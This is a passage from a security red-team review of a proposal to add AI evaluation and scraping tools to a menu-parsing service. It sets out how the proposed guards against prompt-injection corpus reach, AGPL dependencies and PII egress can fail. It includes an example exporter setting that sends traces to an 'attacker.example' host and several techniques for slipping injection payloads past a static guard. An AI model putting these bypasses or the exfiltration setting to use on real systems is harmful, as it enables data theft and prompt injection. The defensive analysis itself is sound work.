# Breaker findings — `tooling-integration-eval`

> System Breaker round vs `proposal.md` + `ADR-tooling-integration-eval.md`.
> Axis: where does each ADOPT/PILOT *break*. Read-only on product code. Zero fixes — findings only.
> Each: `[SEVERITY] vector · finding · break-scenario/number · violated invariant`.

Sinks/guards inspected against the design's claims:
`apps/api/src/lib/ai-ocr-parser.ts:426,508-544` · `apps/api/src/lib/menu-region.ts` ·
`apps/api/src/lib/pii-redactor.ts` · `tools/eslint-plugin-local/src/index.js` ·
`scripts/compliance-gate.ts` · `eslint.config.js` · `.husky/pre-commit` · `Dockerfile`.

---

## CRITICAL

### C1 — B-OPS / B-SEC · The "$0 static guard floor" (G1) is not a merge-blocker as enforced — warn-level lint never fails CI
The proposal stakes everything on G1: §7 calls a corpus `.txt` reaching a prompt path "**Hard CI
fail — merge blocked**" and §7 closes with "the static reachability guard is the **floor** … must be
green or the merge is blocked." That enforcement does not exist on the paths described.

- **Pre-commit** (`.husky/pre-commit`) runs `npx eslint $STAGED` with **no `--max-warnings 0`**.
  ESLint exits `0` on warnings. Every new local rule in this repo lands at `'warn'`
  (`eslint.config.js:31-44`: `no-mock-in-prod`, `no-empty-catch`, `no-direct-websocket` … all `warn`).
  The proposal explicitly models `no-corpus-in-source` on `no-mock-in-prod` (§8.1) — which is `warn`.
- **CI** `"lint": "eslint ."` (`package.json:18`) likewise exits `0` on warnings.
- **Break:** register `no-corpus-in-source` the way its cited sibling is registered (`warn`) → a PR that
  globs the corpus into `apps/api/src/**` lints with a yellow warning and **merges green**. The
  "non-negotiable floor" is advisory.
- **Second hole:** even at `'error'`, pre-commit lints only **`$STAGED`** files. A corpus-reaching file
  committed earlier and not re-staged in the offending PR is never re-linted locally.
- **Violated invariant:** "a fix is not done without a deterministic guardrail that is the *authority*";
  the design's own floor (§7) is unenforced. The whole safety argument ("primary safety property is a $0
  static guard, not an LLM behaviour", §4 Rationale) collapses to discipline.

---

## HIGH

### H1 — B-SEC · G1 rule cannot see runtime `fs` path strings, dynamic paths, or cross-package reads — the corpus still reaches the sink
G1 forbids `apps/api/src/**` non-test files from "referencing the path segment `injection-corpus`
(string literal, glob, `import`, `readFile`, `readdir`)". ESLint is a static AST linter over source
literals; the actual injection-delivery is `redactedText = file-bytes` read at runtime
(`ai-ocr-parser.ts:426` → prompt sink `:542,:544`). Concrete bypasses, none of which the rule sees:

1. **Dynamic path** — `readdir(resolve(__dirname,'../../tests/fixtures', dir))` where `dir` comes from
   a JSON/config value, `process.env.CORPUS_DIR`, or `['injection','corpus'].join('-')`. No literal
   `injection-corpus` exists in the AST. The grounding pipeline already builds paths this way; the rule
   matches a string, not a resolved path.
2. **Cross-scope reader** — the loader lives in `scripts/`, `apps/worker/`, or `packages/*` (all outside
   the rule's `apps/api/src/**` scope), reads the corpus, and feeds `parser.parse()` (the same sink).
   `apps/api/src` contains no offending literal.
3. **Test-helper laundering** — a helper under `apps/api/tests/` (which the rule *permits* to read the
   corpus) is imported into an `apps/api/src/**` file. The `src` file has no `injection-corpus` literal;
   the helper does the `readFile`. Rule fires on neither.
4. **Rename / symlink / copy** — rule keys on the literal segment `injection-corpus` (proposal §8.1
   leans on the dir name being "distinctive"). Rename to `attack-fixtures`, symlink, or
   `cp -r injection-corpus eval-strings` and the segment never appears.

- **Break-scenario:** any of (1)-(4) routes adversarial strings into the live prompt assembly — "we
  built our own injection payload delivery" (proposal's own words, §8.1) — with the gate green.
- **Note on lineage error:** the design says the rule is "the inverse of the existing `no-mock-in-prod`"
  (§8.1). `no-mock-in-prod` (`index.js:458-474`) inspects **`VariableDeclarator` identifier names**
  (`/mock|fake|stub|dummy/`), not literals or paths — it would catch *nothing* about a corpus path. The
  only existing rule that scans `Literal` string values is `no-prod-base-in-test` (`index.js:439-457`),
  and even it only catches **static literals**. The cited template does not do what G1 needs.
- **Violated invariant:** ETHICAL-STOP-1 / ADR-0011 "OCR text is UNTRUSTED data, not instructions" — the
  reachability guard is the only mechanical backstop and it is statically evadable.

### H2 — B-SEC / B-DATA · G5 (the license + PII boundary) is vaporware — the cited script has zero license logic and check B is a fixed allowlist that cannot fire on Skyvern/Confident-AI
§8.2/§8.3/G5 repeatedly claim the AGPL-reach and new-subprocessor risks are "made mechanical" by
`scripts/compliance-gate.ts`, e.g. §8.3: "the existing **check B** already forces it into
`subprocessors.md`." Reading the script:

- **No license check exists.** `compliance-gate.ts` has checks A (PII columns in migrations), B
  (env-var subprocessors), C (raw PII on log/bus), D (DPIA). **None** parse a `package.json`,
  `requirements.txt`, or lockfile for AGPL/GPL. `walk()` only collects `.ts/.tsx` (`:36`). G5(a)
  ("any AGPL/GPL package in a workspace manifest") and G5(b) ("any source `import` of a Skyvern module")
  are entirely **unwritten**, yet R4/R7 mark the AGPL risk "Guarded by the no-AGPL-in-tree check."
- **Check B is a closed allowlist** (`:80-84`): it iterates a hardcoded `SERVICE_ENV` array
  (`RESEND_API_KEY`, `TELEGRAM_BOT_TOKEN`, … `DATABASE_URL_OPERATIONAL`). A brand-new env such as
  `SKYVERN_BASE_URL` / `CONFIDENT_AI_API_KEY` / `DEEPEVAL_API_KEY` is **not in the array**, so the loop
  never examines it. The claim "check B already covers new external-service env vars" (§8.3, G5(c)) is
  factually wrong — B only re-checks the **enumerated** services.
- **Break:** add the Skyvern HTTP endpoint or a DeepEval/Confident-AI key as a new env var, or `pip
  install skyvern` (AGPL) into a venv committed under the repo → `pnpm compliance:gate` prints
  "✓ all invariants hold" and exits 0.
- **Violated invariant:** "no AGPL in the dowiz tree" + "every external-service env in subprocessors.md"
  — both asserted as enforced, neither is.

### H3 — B-SEC · Corpus-grows-from-real-misses (§6) contradicts synthetic-only (§8.3) → real scraped PII egresses to Anthropic (judge) and possibly Confident-AI
The PII-egress safety of DeepEval rests entirely on "**only synthetic fixtures** are ever fed … No
customer PII exists in the eval corpus **by construction**" (§8.3). But §6 (Consistency) prescribes the
opposite growth rule: "New real-world misses are *added* to the corpus (grow-only) … same discipline as
ADR-0011 B1," and R6 anticipates the corpus growing toward "~100 fixtures."

- A "real-world miss" is a **real scraped/OCR menu page**. The entire reason `menu-region.ts` +
  `pii-redactor.ts` exist is that such pages carry incidental third-party PII (staff names, owner phone,
  testimonials — see `menu-region.ts:1-20`, `:69-77`). DeepEval feeds the fixture text to the judge LLM
  (faithfulness / G-Eval) → that PII goes to Anthropic; if any Confident-AI path is live, there too.
- **No mechanism inspects fixture content for PII.** "Synthetic by construction" is an unguarded human
  claim; the only PII controls (redactor/region-isolation) live in `apps/api/src`, not in the CI fixture
  pipeline.
- **Break:** a contributor adds the real page that exposed a parser bug as a frozen fixture (exactly as
  §6 instructs) → its un-redacted owner name/phone is shipped to the judge model on every nightly run.
- **Violated invariant:** ETHICAL-STOP-1 redact-by-default (BINDING, `ai-ocr-parser.ts:418-425`) — third-
  party PII the owner's consent does not cover must never egress to an external model.

### H4 — B-SEC · Skyvern pilot structurally bypasses redact-by-default and aims at exactly the PII-dense pages the parser drops
§8.3 says Skyvern "scrapes **public restaurant pages**, the same class of data the existing pipeline
already reads." It is the *opposite* class. The pilot targets "the **failing tail** — URLs the current
pipeline cannot read" (§2.3) — and Skyvern sends **full-page screenshots + page content** to a vision
LLM.

- The dowiz pipeline never sends raw pages to a model: `menu-region.ts` positively *drops*
  About/Team/Chef/Owner/Contact/Reviews sections (`NON_MENU_HEADING`, `:19-20`) and fails closed if
  residual PII density ≥ 1 (`scanResidualPii`, `:90-98`), *then* `pii-redactor` strips email/phone/card.
  The Skyvern sidecar has **none** of these — it is a separate AGPL container with its own code path.
- The failing tail is disproportionately JS-heavy contact/about pages — precisely where owner names and
  phone numbers live (the menu-region drop-list is the evidence).
- **Break:** the one-shot pilot, by design, ships un-redacted PII-bearing pages to an LLM with zero
  region-isolation and zero redaction — a hard regression from the binding invariant the rest of the
  pipeline upholds. "telemetry off + local LLM" is an env default (`SKYVERN_TELEMETRY=false`,
  `SKYVERN_LLM=...`) with **no mechanical lock**; an operator flips to Anthropic vision "for better
  results" and the contact-page PII leaves the box. Nothing in CI or compliance-gate observes the
  sidecar (§9: kill-switch = "docker stop" on an operator host).
- **Violated invariant:** redact-by-default / ETHICAL-STOP-1; "no tool egresses third-party PII to an
  external model."

---

## MEDIUM

### M1 — B-FAIL · DeepEval egress control is a fail-open **denylist**, and there is **no** block at all for local runs
G2 / §8.3 / R3 describe an "egress **denylist** that blocks PostHog / Sentry / NewRelic / Confident-AI
hosts," verified by "probe a blocked host → expect failure."

- A denylist is fail-open by construction: it proves the *named* probe host is blocked, not that the
  process cannot reach an *unlisted* sink. The OTel #2497 hijack exports to an arbitrary
  `OTEL_EXPORTER_OTLP_ENDPOINT` (host/IP), and a transitive dep bump can add a new analytics host — none
  on the enumerated denylist. §7 even asserts "no `OTEL_EXPORTER_*` endpoint is reachable," but a
  host-name denylist cannot prove unreachability of an arbitrary endpoint/IP.
- **Local dev has no network policy at all.** Enforcement is "the CI job." A developer running
  `deepeval test ...` locally (the normal authoring loop) has no denylist and no synthetic-only check →
  telemetry/judge calls fire on whatever fixture is on disk (see H3).
- **Break:** `OTEL_EXPORTER_OTLP_ENDPOINT=https://collector.attacker.example` (or any non-denylisted
  host) set by a transitive default or a dev's shell → traces exfiltrate; CI's host-denylist probe still
  passes because it only tests the four named hosts.
- **Violated invariant:** "egress blocked" must be enforceable (allowlist / network jail), not "hoped-for"
  via an enumerated denylist; PII-egress red-line.

### M2 — B-DATA · The corpus `.txt` is `COPY`'d into the build image; only a tsc accident keeps it out of the runtime, and no guard watches the boundary
`Dockerfile:12` is `COPY apps ./apps` — the **entire** `apps/api/tests/fixtures/injection-corpus/`
enters the builder stage. The runtime stage copies only `/app/dist` (`:35`) + public (`:38-39`), and
`tsc` does not emit `.txt`, so the corpus does not reach the prod runtime **today**.

- This boundary holds by *accident of the toolchain*, not by design or guard. The G1 ESLint rule does
  not inspect `Dockerfile` COPY directives. The moment someone adds an asset-copy/esbuild step, a
  `COPY apps/api/tests` for an in-image test stage, or changes the runtime COPY, the adversarial corpus
  ships inside the production image — within reach of any runtime `readdir`/path-traversal — and **no
  gate fires** (G1 is source-AST-only; compliance-gate doesn't scan the image).
- **Break (number):** 30 (→ ~100, R6) inert injection payloads sitting in the builder context, one
  `COPY` line away from the runtime FS, guarded by nothing.
- **Violated invariant:** "the corpus dir can never reach a prompt path" — the guard covers source
  literals, not packaging.

### M3 — B-ANTIPATTERN / B-OPS · DEFER/REJECT items have no mechanical fence — LangGraph/WorkOS/AGPL-reject leak back with zero gate
The ADR DEFERs LangGraph-JS and WorkOS/auth.md and REJECTs Recall/MoneyPrinter/Glossopetrae/Reverse —
all as **prose**. R7 ("a future contributor wires Skyvern as a live fallback") is dispositioned
"Defer-flag — the no-AGPL-import + no-DB-credential guards make this fail CI." Per H2 those guards do
not exist, so:

- **Break:** `pnpm add langgraph` / `@workos-inc/node` "just for the pilot," or copy a Glossopetrae
  encoding inline → `pnpm lint`, `pnpm compliance:gate`, pre-commit all pass. There is no
  forbidden-dependency list anywhere in the toolchain.
- The kill-switch table (§9) names *owners* but no expiry/monitor: a "one-shot" Skyvern sidecar that is
  never `docker stop`'d becomes a persistent always-on AGPL + egress surface (the Option-C outcome the
  ADR claims to reject) with nothing detecting it is still up.
- **Violated invariant:** "boring & proven > novelty," "schema rich / runtime minimal," and the ADR's own
  DEFER/REJECT decisions — none are enforced, all rely on reviewer memory.

---

## LOW

### L1 — B-CONSIST · DeepEval judge "exact integer-minor-unit price match" is asserted against a redactor that mutates digit strings
§6 / Money: price correctness is "exact integer-minor-unit match, zero tolerance," and the behavioural
test (G1) asserts "prices stay grounded" against fixtures fed "as OCR input." But the parser grounds
against `redactedText` (`ai-ocr-parser.ts:598`), and `pii-redactor.ts`'s `card`/`phone` patterns match
runs of 13-19 / 8+ digits (`:34-42`). A synthetic injection/price fixture containing a long digit
sequence (e.g., an embedded "order #" or a 14-digit code beside a price) can be partially `[REDACTED]`,
shifting the grounded price-token set.

- **Break:** a fixture authored to look like a real menu with a long numeric string adjacent to prices →
  the redactor eats digits → the "exact price match" assertion flaps or false-reds, undermining the one
  place §6 claims absolute determinism.
- **Violated invariant:** money exact-match determinism; this is LOW because it degrades the *gate's*
  stability, not production money.

### L2 — B-OPS · "Observability < 1 min" and "advisory vs blocking" rest on distinguishing infra-failure from quality-failure with no defined mechanism
§7 and §9 promise the eval distinguishes a judge-LLM 5xx/timeout (advisory, non-blocking) from a
threshold breach (blocking). DeepEval surfaces both as metric failures; there is no described signal
that separates a provider outage from a real regression. Risk: either a provider 500 blocks all merges
(false-block), or "treat ambiguous as advisory" silently downgrades a real quality regression to a
non-blocking note.
- **Violated invariant:** "health distinguishes degraded vs down" — asserted, not specified.

---

## Regression check vs the design's own claims (summary)

| Design claim | Reality | Finding |
|---|---|---|
| G1 static guard = "merge blocked" floor (§7) | new rules land `warn`; pre-commit/CI exit 0 on warn | C1 |
| G1 catches glob/readFile of corpus (§8.1) | AST-only; dynamic path / cross-scope / rename / helper evade | H1 |
| "inverse of `no-mock-in-prod`" (§8.1) | that rule checks var *names*, not paths | H1 |
| compliance-gate "check B already covers" new subprocessors (§8.3) | check B is a fixed enum; new env never examined | H2 |
| AGPL "guarded by no-AGPL check" (R4/R7/G5) | no license logic exists in the script | H2 |
| "synthetic only by construction" (§8.3) | §6 grows corpus from real misses; no PII inspection | H3 |
| Skyvern "same class of data the pipeline already reads" (§8.3) | targets PII-dense failing tail; no region-isolation/redaction | H4 |
| "egress blocked" (G2) | fail-open host denylist; no local-run block | M1 |
| "corpus can never reach a prompt path" | `COPY apps` puts it in the image; guard is source-only | M2 |
| DEFER/REJECT enforced (R7) | prose only; no forbidden-dep gate | M3 |

---

## RE-ATTACK round (2026-06-29) — vs RESOLVE-round `proposal.md` + `resolution.md`

> Second pass. Question 1: did a FIX open a NEW hole? Question 2: are the fixes sufficient, or do
> they just *move* the bypass? Grounded this round against live source:
> `scripts/compliance-gate.ts:80-89` · `scripts/verify-all.ts:13-28` · `scripts/build-apps.ts:95-104` ·
> `.dockerignore` · `packages/config/src/index.ts` (env list) · `apps/api/src/lib/pii-redactor.ts:10-43` ·
> `.husky/pre-commit` · all workspace `package.json` (`private:true`, no `license`).
> Findings prefixed `RA-`. Closed-item regression confirmations at the end.

### HIGH

#### RA-1 — B-SEC · The G5(c) env-pattern detector storms on ~18 internal envs → forced back into a closed acceptlist = the exact H2 bypass, relocated
The H2 fix replaces the closed `SERVICE_ENV` enum (`compliance-gate.ts:80-84`) with a pattern detector:
flag every `/_(URL|KEY|TOKEN|SECRET|DSN|ENDPOINT)$/` identifier in `packages/config/src/index.ts` not in
`subprocessors.md` (resolution H2 / proposal G5(c)).
- **Number:** that regex matches **~30** identifiers in `config/src/index.ts`. The vast majority are
  **internal**, not subprocessors: `APP_BASE_URL`, `DATABASE_URL_OPERATIONAL`, `JWT_PRIVATE_KEY`,
  `JWT_PUBLIC_KEY`, `JWT_DEV_PRIVATE_KEY`, `JWT_DEV_PUBLIC_KEY`, `DEV_AUTH_SECRET`, `TELEGRAM_BOT_SECRET`,
  `BACKUP_ENCRYPTION_KEY`, `R2_SECRET_ACCESS_KEY`, `R2_PUBLIC_URL`, `VAPID_PUBLIC_KEY`, `VAPID_PRIVATE_KEY`,
  `COURIER_PII_ENCRYPTION_KEY`, `MEM0_OLLAMA_URL`, `LLM_ENDPOINT`, `TRANSLATION_ENDPOINT`,
  `OPENROUTER_ENDPOINT`, `OPENCODE_ZEN_ENDPOINT`, `GROQ_ENDPOINT`, `OPENAI_ENDPOINT`, `ROUTING_API_KEY` …
  The acceptlist (`SERVICE_ENV`) holds **12**. ⇒ **~18 false-positives on the first run.**
- **Break:** a JWT signing key and a PII-encryption key are not subprocessors and will *never* appear in
  `subprocessors.md`, so the only ways to get green are (a) widen the acceptlist or (b) loosen the regex —
  both rebuild a hand-maintained closed list. The resolution's escape ("heuristic: read from `process.env`
  and used to reach a host/credential") is **unimplemented hand-waving** — there is no pattern-level signal
  that separates `JWT_PRIVATE_KEY` (internal) from `SKYVERN_BASE_URL` (external); both are `process.env`
  reads. The most probable landing is a fat acceptlist, at which point a new `SKYVERN_BASE_URL` that a
  contributor *also* adds to the acceptlist (one line, next to 30 others, invisible in review) sails
  through — **the H2 closed-enum bypass, moved 6 lines down.**
- **Violated invariant:** "every external-service env in `subprocessors.md`, enforced not by reviewer
  memory." The fix converts a false-negative gate into a false-positive gate, whose only survivable
  configuration is a manual allowlist — i.e. the thing H2 was filed to kill.

#### RA-2 — B-DATA / B-OPS · The G5(a) license check storms on dowiz's OWN packages (all `private`, no `license`) and on LGPL / dual-SPDX deps → "fail on missing/GPL-*" is unshippable as written
The H2/M3 fix: parse the `pnpm-lock.yaml` production closure and **exit 1 on any `AGPL-*`/`GPL-*`/
`UNLICENSED`/missing-license** package (resolution H2 / proposal G5(a), R4/R7).
- **Verified:** every workspace `package.json` checked (`/package.json`, `apps/api`, `packages/db`,
  `packages/config`) is `"private": true` with **no `license` field**. The production closure of any
  `apps/*`/`packages/*` workspace *includes the workspace packages themselves* → every one trips
  "missing-license" ⇒ exit 1 on the first run, against dowiz's own first-party code.
- **`GPL-*` matches LGPL.** A glob/substring on `GPL-*` (or `/GPL/`) matches `LGPL-3.0`/`LGPL-2.1` — a
  permissive-for-dynamic-linking license that is *fine* and ships in many transitive trees → false red.
- **SPDX expressions.** Legit dual licenses like `(MIT OR GPL-2.0)` / `(LGPL-3.0 OR MIT)` are usable under
  the non-copyleft option; a substring fail trips them too.
- **Break:** the gate's first run is all-red (own private packages + any LGPL/dual transitive). The
  inevitable mitigation is carve-outs ("skip `private:true`", "skip workspace pkgs", "allow LGPL", a
  license-string allowlist) — each carve-out is a new place a *real* `AGPL`/missing-license dep hides, and
  none of those carve-outs are specified in the resolution. The "no AGPL in tree" gate is either disabled
  by storm or so carved-up its soundness is unproven.
- **Violated invariant:** "no AGPL/GPL in the dowiz tree, made mechanical." A gate that cannot go green on
  the current clean tree is not mechanical — it is off.

### MEDIUM

#### RA-3 — B-SEC · "dist/Docker-image-aware" is a Dockerfile-text grep + an order-dependent `dist/` glob, NOT image inspection — and it misses the real asset pipeline (`build-apps.ts`)
Proposal G1 item 2 / §7 claim the reachability guard is "dist/image-aware." What it actually does
(resolution H1/M2): grep `Dockerfile` for `COPY … tests` + scan `**/dist/**` for the sentinel.
- **The real asset path is unscanned.** `Dockerfile:27` runs `pnpm dlx tsx scripts/build-apps.ts`; that
  script (`build-apps.ts:95-104`) is what assembles `dist/public` via `fs.cpSync(apiPublic, distPublic, …)`
  / `fs.cpSync(webDist, …)`. A future fixture/asset reaching the image goes through *this* `cpSync`, not a
  Dockerfile `COPY`. Grepping `Dockerfile` for `tests` sees **nothing** of `build-apps.ts`. The guard greps
  the wrong file.
- **The dist-scan is vacuous in `verify:all`.** `verify-all.ts:13-28` (`STEPS`) has env/db/rls/lint/
  typecheck/i18n/guardrails but **no `bundle`/`build-apps` step** — so when the corpus guard runs inside
  `verify:all`, `dist/` may not exist and the `**/dist/**` sentinel scan passes on an empty set. It only
  has teeth if a build ran first in the same job; nothing sequences that.
- **Break:** the guard reports "image-clean" while never having looked at an image, a built bundle, or the
  program (`build-apps.ts`) that actually populates the shipped `dist/public`.
- **Violated invariant:** "the corpus can never reach a prompt path / the image" — asserted as
  mechanically checked; the check inspects neither the image nor the bundler.

#### RA-4 — B-SEC · `.dockerignore`'s bare `tests` does NOT exclude `apps/api/tests/` — the corpus still enters the builder, and a substring guard false-greens on it
M2's fix asserts ".dockerignore excludes `apps/api/tests/`" (proposal G1 item 2; resolution M2). The live
`.dockerignore` line is a **bare** `tests` (and `e2e`).
- **Docker semantics:** `.dockerignore` matches relative to the build-context root; a bare `tests` excludes
  only `<root>/tests`, **not** nested `apps/api/tests`. The same file proves the author knows this — it uses
  `**/node_modules`, `**/dist`, `**/coverage` for nested dirs but bare `tests`. So `COPY apps ./apps`
  (`Dockerfile:12`) **still pulls `apps/api/tests/fixtures/injection-corpus/` into the builder context**.
- **The guard can be fooled by its own check.** A naive implementation ("`.dockerignore` contains
  `tests`") returns green against the existing bare line while Docker keeps copying the corpus →
  false-green on the very property M2 was filed to enforce. The fix is only real if it adds a *nested*
  pattern (`**/tests` / explicit path) AND the guard verifies the *effective* match, not a substring.
- **Break:** corpus present in builder context today; runtime exclusion still rests on the same tsc accident
  M2 flagged (`tsc` emits no `.txt`), now with a guard that may certify the accident as a control.

#### RA-5 — B-SEC · The H3 fixture-PII gate inherits the redactor's role-anchored name regex → a bare third-party name passes the gate and egresses to the Anthropic judge
H3's "synthetic-by-construction becomes *enforced, not asserted*" rests on a fixture-content gate reusing
`pii-redactor.ts` patterns (proposal §6 / G1 item 4; resolution H3).
- **The name pattern is anchored to a role trigger.** `pii-redactor.ts:19` only matches a TitleCase name
  **preceded** by `Chef|Owner|Manager|Founder|Director|Proprietor|Host|By|Meet|Served by|Prepared by`. A
  bare personal name with no trigger — "ask for Maria when you ring", "Hoxha family recipe", a reviewer
  byline "— Arben" — is **not** matched. The growth ritual's whole point (resolution H3) is paraphrasing a
  real near-miss; a paraphrase that keeps a real reviewer/owner *name* (the single most common PII on the
  failing-tail About/Reviews pages, per `menu-region.ts:19-20`) passes the gate.
- **Break:** committed fixture → DeepEval feeds it to the Anthropic judge (faithfulness/G-Eval) every
  nightly → a real third-party name egresses to an external model. The gate catches digits (card/phone ≥8),
  emails, query-URLs, triggered-names — **not bare names.**
- **Why MEDIUM not HIGH:** the ritual also mandates a human-review step before commit, so the human is the
  real floor — but the resolution markets the gate as the mechanical backstop ("enforced, not asserted"),
  and on bare names that claim is false; it is "human-asserted," same as before H3.
- **Violated invariant:** redact-by-default / ETHICAL-STOP-1 — third-party PII must not egress to an
  external model; the mechanical net has a name-shaped hole.

#### RA-6 — B-FAIL / B-SEC · DeepEval "local-run fail-closed" binds only the wrapper — the raw `deepeval` CLI in the venv bypasses opt-out + PII gate
Resolution M1/G2: "the eval entrypoint refuses unless `DEEPEVAL_TELEMETRY_OPT_OUT=1` AND the fixture-PII
gate passes AND `--synthetic-only`." This is enforced by the dowiz **wrapper** entrypoint only.
- **Break:** the venv installs the `deepeval` binary. A dev runs `deepeval test run my_eval.py` directly —
  the wrapper's opt-out assertion, PII gate, and `--synthetic-only` flag never execute; locally there is
  **no network policy** (the allowlist is a CI-only network construct, R10) so telemetry/judge calls fire
  on whatever file is on disk. The "fail-closed" is convention, not a lock — nothing forces the wrapper.
- The proposal states local runs *are* fail-closed (proposal §7 row 2, §8.3). That is an overclaim: it is
  fail-closed *if you use the wrapper*, fully open if you call the tool the venv exposes.
- **Violated invariant:** PII-egress must be enforceable, not opt-in via a wrapper a dev can sidestep.

#### RA-7 — B-SEC · Skyvern's "machine-checked local-LLM attestation" checks a host *string*, not network behaviour; menu-only target restriction is unenforceable on the exact (SPA) class it targets
H4's two new mechanical controls both reduce to operator honesty on inspection.
- **Attestation = string check.** The runner asserts `SKYVERN_LLM` "resolves to a local/loopback host"
  (resolution H4 / G4(b)). A `localhost:8000` reverse-proxy / SSH tunnel / sidecar egress-proxy to Anthropic
  vision **satisfies** "loopback host" and is then *also* permitted by the egress allowlist `{targets,
  local LLM}` (G4(d)) because the local LLM endpoint is allowlisted. The machine checks the *label*, not
  where the bytes go. To prove "local," you must inspect real egress — the proposal explicitly only checks
  the host string.
- **Menu-only restriction can't classify the failing tail.** G4(a) excludes any URL resolving to a
  `menu-region` NON_MENU class *before* Skyvern runs. But the pilot input *is* "URLs the current pipeline
  **cannot read**" (§2.3) — JS-heavy SPAs. `menu-region` classifies by **heading content of fetched text**;
  if the pipeline can't fetch/parse the page, there is no text to classify, so the only pre-filter left is a
  URL-path heuristic (`/contact`, `/about`) — which fails exactly on the single-page sites (everything on
  `/`) that dominate the failing tail. The PII-dense page you most need to exclude is the one you can't
  pre-classify.
- **Break:** both mechanical controls degrade to the env-default/operator-honesty posture H4 already flagged
  as insufficient; the real remaining floor is the human PII review of a sample (G4(e)) — a sample, on
  unbounded full-page screenshots sent to whatever the "local" host actually proxies to.
- **Violated invariant:** redact-by-default on a 🔴 surface enforced by *machine*, not by an attestable
  string + a sampled human read.

### LOW

#### RA-8 — B-OPS · The alphabetic sentinel collides with the guard's own source (scope includes `scripts/**`) → bootstrap false-positive pressures exclusions, the new bypass surface
The scan scope is `apps/** packages/** scripts/**` minus test globs (proposal G1; resolution H1). The
sentinel literal (`DOWIZ-INJECTION-CORPUS-SENTINEL…`) **must** appear inside
`scripts/guardrail-corpus-reachability.mjs` (to grep for it) and likely in the DeepEval wrapper / any doc
comment in-scope — all non-test files in-scope ⇒ the scan matches its **own** machinery and exits 1
falsely. The fix is a self-exclusion list; every self-exclusion is a path a real reaching loader can be
parked in. (`docs/**` — where proposal/resolution/this file quote the sentinel and `injection-corpus` — is
out of scope, so those don't trip; the in-scope `scripts/**` collision does.) The "rename-proof alphabetic
sentinel" is also a plain string a loader can `base64`/`split`/`String.fromCharCode` to avoid emitting —
already accepted as residual (H1), noted here only to mark that the *same* obfuscation that defeats the
content scan is what a malicious loader would use anyway.

### Regression check — prior findings now adequately closed (not re-litigated)

| Prior | Status after RESOLVE | Note |
|---|---|---|
| **C1** (warn-lint never blocks) | **Closed in mechanism** | exit-1 standalone script + `verify-all.ts` `run()` (`:30-37`) propagates a non-zero child exit → `failures++` → `process.exit(1)`. Sound **once added** to `STEPS` (`:13-28`, not yet present) and pre-commit (`|| exit 1`, cf. the existing pattern). Residual: dist-scan ordering = RA-3. |
| **M3** (no forbidden-dep fence) | **Closed in mechanism** | a literal forbidden-dep list + lockfile/import scan is deterministic and sound; only as good as RA-2's license-arm shipping at all. |
| **L1** (redactor mangles price fixtures) | **Closed** | alphabetic sentinel (no digit run) + separate injection/price fixture sets — correct; the redactor's digit patterns (`pii-redactor.ts:34-42`) can't touch the sentinel. |
| **L2** (advisory vs blocking) | **Closed** | `NEEDS-RERUN` sticky discriminator (transport-error→exit 0 advisory, computed-breach→exit 1) is a defined, reasonable mechanism. |
| **H1** (AST can't see runtime sink) | **Improved, residual named** | whole-tree content+sentinel scan + import-edge pass is materially better than the AST rule; base64/dynamic-loader residual is explicitly accepted (= ADR-0011 R1). New residuals: RA-3 (image), RA-8 (self-collision). |

**Net RE-ATTACK verdict:** C1/M3/L1/L2 are genuinely closed. The three HIGH-origin fixes (**H2 env detector,
H2 license check, H4 Skyvern**) do not close their holes — they **relocate** them: H2 trades a
false-negative enum for a false-positive storm that survives only as a re-grown allowlist (RA-1) or a
disabled gate (RA-2); H4's two new "mechanical" controls reduce to a host-string label (RA-7). H3's
mechanical PII backstop has a bare-name hole (RA-5). Plus two new mechanism-fidelity gaps: image-awareness
greps the wrong file (RA-3) and `.dockerignore` doesn't match nested (RA-4). 0 CRITICAL, 2 HIGH, 5 MEDIUM,
1 LOW.

---

## FINAL regression round (2026-06-29) — vs RESOLVE round 2

> Scope: did the three round-2 mechanisms introduce a NEW CRITICAL/HIGH? Verified live at HEAD of
> `feat/mvp-sensor-seams`: `Dockerfile:10-13,27,35-39` · `scripts/build-apps.ts:95-104` ·
> `.dockerignore:1-11` · `package.json:18,32` · `tsconfig.base.json` (no `include`/refs) ·
> `scripts/compliance-gate.ts:79-89` · `packages/config/src/index.ts:14,116,138-156`.
> Not re-litigated: C1/M3/L1/L2/H1-residual (closed) and the accept-risk(owner) RA-5/6/7.

**Verdict: the architect's HARD-EXIT holds. No genuinely-new CRITICAL or HIGH from the three fixes.**
Per-item below; only MEDIUM/LOW residuals (two of them genuinely new) remain.

### 1. Env-classification manifest (fail-closed) — SOUND as scoped; "fail-closed" is over-stated, but the gap is INHERITED, not new.
The gate is genuinely fail-closed for the set it can see: a matched, *declared* env with no manifest row
→ exit 1; an `external-subprocessor` row absent from `subprocessors.md` → exit 1. That is a real
improvement over the closed enum and does not open a new hole. Two coverage gaps exist but **predate
round 2** (so I do not score them NEW HIGH — no severity inflation):
- **Suffix blind spot (inherited).** The trigger is `/_(URL|KEY|TOKEN|SECRET|DSN|ENDPOINT)$/` on Zod keys.
  An external service named outside that suffix set is never *required* to be classified — e.g. the task's
  `SKYVERN_HOST` / `CONFIDENT_AI_BASE`, or the live `GOOGLE_CLIENT_ID` (`config:14`, external=Google, ends
  `_ID`, unmatched — Google is only pulled in incidentally via `GOOGLE_CLIENT_SECRET`). `_HOST`/`_BASE`/
  `_REGION`/`_ACCOUNT`/`_ID`/`_PROJECT` are mainstream naming; an external whose envs use only those slips
  the manifest silently. Round-1's detector keyed on the *same* regex, so this is not introduced by round 2.
- **Undeclared-`process.env` blind spot (inherited, the stronger one).** The gate's source of truth is
  `packages/config/src/index.ts` Zod keys only. A new external env read directly via `process.env.X` in code
  and never added to the schema is invisible — even if it *does* match the suffix. Live precedent: the
  "Missing from earlier schema — added 2026-06-13 audit" block (`config:138-156`) proves envs are used
  before being declared here. Original check B had the identical input surface; not new.
- **Honest call:** the resolution's residual (R12) names only *misclassification*; it does **not** name
  these two coverage gaps, so the "fail-closed" framing newly *masks* them. That mis-framing is the only
  round-2-attributable item, and it is **LOW** (documentation/claim accuracy), not a new HIGH.

### 2. License scan + `license-exceptions.md` — core SOUND; two GENUINELY-NEW but narrow MEDIUM residuals.
The hard deny of *declared* `AGPL-*`/`GPL-*` SPDX IDs (third-party closure, LGPL≠GPL, dual-OR handled)
remains exit-1 and is not parkable — the dumping-ground fear does **not** materialise for declared copyleft.
But round 2 introduced two soft paths that round 1 did not have:
- **[MEDIUM] B-DATA · License-omitting AGPL routes to the parkable exceptions bucket (NEW).** Round 2 added
  `license-exceptions.md` to clear the *missing-license* case. A dep that is actually AGPL but ships **no
